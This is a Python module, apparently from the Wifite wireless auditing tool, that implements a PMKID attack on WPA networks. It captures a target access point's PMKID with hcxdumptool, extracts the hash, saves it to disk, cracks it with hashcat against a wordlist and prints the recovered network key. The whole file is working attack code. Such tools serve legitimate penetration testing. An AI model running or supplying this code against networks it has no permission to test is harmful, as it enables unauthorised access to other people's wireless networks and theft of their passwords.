#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapTool, Hashcat
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID

from threading import Thread
import os
import time
import re


class AttackPMKID(Attack):

    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.success = False
        self.pcapng_file = Configuration.temp('pmkid.pcapng')


    def run(self):
        # TODO: Check ./hs/ for previously-captured PMKID, skip to crack if found.
        self.keep_capturing = True
        self.timer = Timer(60)

        # Start hcxdumptool
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break  # Got PMKID

            Color.pattack('PMKID', self.target, 'CAPTURE',
                    'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE',
                    '{R}Failed{O} to capture PMKID.')
            return False  # No hash found.

        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        pmkid_file = self.save_pmkid(pmkid_hash)

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}Not cracking because {R}wordlist{O} is not set.')
            Color.pl('{!} {O}Run Wifite with the {R}--crack{O} and {R}--dict{O} options to try again.')
            key = None
        else:
            Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID...  ')
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is None:
            # Failed to crack.
            Color.pattack('PMKID', self.target, 'CRACK',
                    '{R}Failed{O} to crack PMKID    ')
            Color.pl("")
            return False
        else:
            # Successfully cracked.
            Color.pattack('PMKID', self.target, '',
                    '{C}Cracked PMKID. Key: {G}%s{W}' % key)
            Color.pl("")
            self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                    pmkid_hash, pmkid_file, key)
            self.crack_result.dump()
            self.success = True
            return True


    def dumptool_thread(self):
        dumptool = HcxDumpTool(self.target, self.pcapng_file)

        # Let the dump tool run until we have the hash.
        while self.keep_capturing and dumptool.poll() == None:
            time.sleep(0.5)

        dumptool.interrupt()


    def save_pmkid(self, pmkid_hash):
        '''
            Saves a copy of the pmkid (handshake) to hs/
        '''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.mkdir(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        pmkid_file = 'pmkid_%s_%s_%s.16800' % (essid_safe, bssid_safe, date)
        pmkid_file = os.path.join(Configuration.wpa_handshake_dir, pmkid_file)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % pmkid_file)
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')
        Color.pl('{G}saved{W}')

        return pmkid_file
